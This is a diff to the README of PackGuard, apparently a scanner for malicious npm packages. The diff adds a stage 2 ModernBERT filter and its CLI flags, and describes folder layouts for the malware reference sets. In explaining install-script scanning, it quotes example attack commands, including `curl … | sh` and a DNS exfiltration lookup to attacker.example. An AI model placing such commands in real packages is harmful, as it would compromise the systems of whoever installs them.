@@ -54,10 +54,13 @@ PackGuard/
 │   ├── report.c / .h           # JSON output per package
 │   ├── platform.c / .h         # Threads, directory walk, clock (POSIX and Win32)
 │   ├── packguard.manifest      # Windows: UTF-8 code page, long paths
-│   └── ai_filter.c / .h        # Stage 2 inference (ONNX Runtime C API), planned
+│   └── ai_filter.c / .h        # Stage 2 inference in C (planned; the CLI runs the Python filter)
 ├── training/
 │   └── finetune_packguard.py   # Stage 2 fine-tuning (Hugging Face), planned
-├── frontend/                   # Rust CLI/TUI wrapper around the C scanner
+├── stage 2 LLM Model/          # Stage 2: ModernBERT fine-tuning, 8-bit ONNX export, installer, filter CLI
+│   ├── v1/                     # Baseline training and export scripts
+│   └── v2/                     # Recommended model, installer and stage2_filter.py
+├── frontend/                   # Rust CLI/TUI wrapper around the C scanner, runs stage 2 with --stage2
 ├── data/v1/malware_js_*.zip    # v1 malware set, 16 encrypted zips, see dataset_index.md
 ├── data/v2/malware_js_*.zip    # v2 malware set (install scripts, tuned ratio), 16 encrypted zips
 ├── tests/                      # Test inputs and outputs, one folder per function
@@ -171,7 +174,7 @@ build/packguard [--mode known|new] [-j threads] [-p candidates] [-m bytes] [-b 0
 
 The references are loaded and their C(x) cached once, then every package is scanned in turn, so many packages per run is much faster than one run per package. Byte-identical reference chunks are scored once: v1 has 190,939 chunks but only 69,249 distinct ones, and this never changes a score. Exit status is 0 on success, 1 if any package failed and 2 for a usage error.
 
-**Folder layout.** The scanner does not create these folders; it expects a fixed structure. The malware reference directory uses `<group>/<package>@<version>/<file>`, the `-B` benign directory is flat (`<package>@<version>/<file>`), and every package path is one package root. See [`docs/folder-layout.md`](docs/folder-layout.md) for the three trees, the exact file and folder rules, and the commands that build them from the shipped zips or the npm corpus.
+**Folder layout.** The scanner does not create these folders; it expects a fixed structure. The malware reference directory uses `<group>/<package>@<version>/<file>`, where `<group>` is any label for the first folder below the reference directory — in the shipped v1 and v2 sets it is the 12-hex-digit code-shape id, one folder per shape — and the benign `-B` directory is flat (`<package>@<version>/<file>`), with every package path being one package root. See [`docs/folder-layout.md`](docs/folder-layout.md) for the three trees, the exact file and folder rules, the shipped group ids and the commands that build them from the shipped zips or the npm corpus.
 
 **Modes.** `--mode known` (v6) is for renamed and mangled known families: `-c 2 -n 1 -e 2 -x 1 -b 1 -t 0.70 -u 0.65 -s 0.50 -g 0.10 -G 0.07 -q 64`, and it needs `-B <benign_dir>` for the benign veto (it warns without it). On the v4 mangling benchmark it flags T1 97.5%, T2 94.2%, T3 94.2% and T4 96.7% of the malware variants and 2.2% of the benign controls (1.3% with `-q 256`, at 700 s instead of 469 s); v5 flagged 35.3% of the benign controls. See [`experiments/v6/`](experiments/v6/README.md). `--mode new` is the new-campaign path: it scores the raw view, adds an install-script/JavaScript behavioural-primitive flag, and does not load the normalised view, at 0.50 ([`experiments/v5/`](experiments/v5/README.md)).
 
@@ -188,10 +191,14 @@ cd frontend
 cargo build --release
 ./target/release/packguard-cli --mode new --refs <reference_dir> --scan-dir <package_dir>
 ./target/release/packguard-cli --mode known --refs <reference_dir> --benign <benign_dir> --scan-dir <package_dir>
+./target/release/packguard-cli --mode known --refs <reference_dir> --benign <benign_dir> \
+    --scan-dir <package_dir> --stage2 --stage2-model "stage 2 LLM Model/v2/model_int8"
 ./target/release/packguard-cli --tui --packguard ../build/packguard
 ```
 
 The C scanner must be built first and either be on `PATH` as `packguard` (`packguard.exe` on Windows) or passed with `--packguard`. On Windows use `packguard.exe` and scan only benign code; malware stays inside WSL. The wrapper does not implement detection itself.
+
+`--stage2` sends the reports of the same run through the Python stage 2 filter (`stage 2 LLM Model/v2/stage2_filter.py`) and prints the model probability next to each stage 1 score; only packages stage 1 flagged are scored, and the final `FLAGGED` column is the stage 1 result confirmed by stage 2. Install the model once with `stage 2 LLM Model/v2/install_model.sh`; `--stage2-model` points at a different ONNX directory, `--stage2-python` at a different interpreter and `--stage2-script` at a different `stage2_filter.py`.
 
 **Install scripts.** Many malicious packages carry their whole attack in `package.json`, as a `preinstall`, `install` or `postinstall` command (`curl … | sh`, `nslookup $(whoami).attacker.example`). The scanner reads the `package.json` at the package root, keeps only those three commands, one per line, and scores that text like any other file (it appears as `package.json` in the report). A `package.json` deeper in the package is skipped, since npm never runs its scripts. Reference sets keep no `package.json`; they store the same text as `install_scripts.txt`, which the scanner reads whole.
 
